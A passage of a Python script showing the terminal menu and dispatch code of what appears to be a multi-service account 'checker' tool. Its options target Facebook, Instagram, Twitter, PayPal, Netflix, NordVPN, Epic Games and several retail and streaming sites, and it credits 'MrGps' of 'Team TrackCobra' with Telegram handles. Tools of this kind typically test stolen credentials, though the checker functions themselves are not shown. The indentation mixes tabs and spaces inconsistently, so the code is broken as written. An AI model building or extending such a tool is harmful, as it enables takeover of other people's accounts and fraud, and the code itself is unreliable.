\033[0;36m [\033[0;37m01\033[0;36m] \033[0;37mChecker \033[0;36mFace\033[0;37mbook
\033[0;36m [\033[0;37m02\033[0;36m] \033[0;37mChecker \033[0;36mInsta\033[0;37mgram
\033[0;36m [\033[0;37m03\033[0;36m] \033[0;37mChecker \033[0;36mTiwtt\033[0;37mer
\033[0;36m [\033[0;37m04\033[0;36m] \033[0;37mChecker \033[0;36mPay\033[0;37mpal
\033[0;36m [\033[0;37m05\033[0;36m] \033[0;37mChecker \033[0;36mNo\033[0;37mon
\033[0;36m [\033[0;37m06\033[0;36m] \033[0;37mChecker \033[0;36mCrunchy\033[0;37mRoll
\033[0;36m [\033[0;37m07\033[0;36m] \033[0;37mChecker \033[0;36mNam\033[0;37mshi
\033[0;36m [\033[0;37m08\033[0;36m] \033[0;37mChecker \033[0;36mEpic\033[0;37mGames
\033[0;36m [\033[0;37m09\033[0;36m] \033[0;37mChecker \033[0;36mNet\033[0;37mflix
\033[0;36m [\033[0;37m10\033[0;36m] \033[0;37mChecker \033[0;36mNord\033[0;37mVpn
\033[0;36m [\033[0;37m11\033[0;36m] \033[0;36mProgramm\033[0;37mer
\033[0;36m [\033[0;37m00\033[0;36m] \033[0;36mEx\033[0;37mit
  ''')

	choose = input(' \033[0;36m[\033[0;37m?\033[0;36m] \033[0;37mChoose \033[0;36mNumber \033[0;37m/\033[0;36m ')

    
    # start Checkers !

	
	if choose == '1':
		Facebook()

	elif choose == '2':
		Instagram()

	elif choose == '3':
  	  Tiwtter()
    
	elif choose == '4':
	       Paypal()
        
	elif choose == '5':
		Noon()

	elif choose == '6':
		CrunchyRoll()

	elif choose == '7':
		Namshi()

	elif choose == '8':
		EpicGames()

	elif choose == '9':
		Netflix()

	elif choose == '10':
		NordVpn()

	elif choose == '11':
		programmer = '''
 The Programmer MrGps <--> Team TrackCobra
 Telegram Channel : @MrGps0
 My Acc Telegram : @MrGps1
 Github : MrGps1
		'''
		print(programmer)

	else:
	       exit()
        

Start()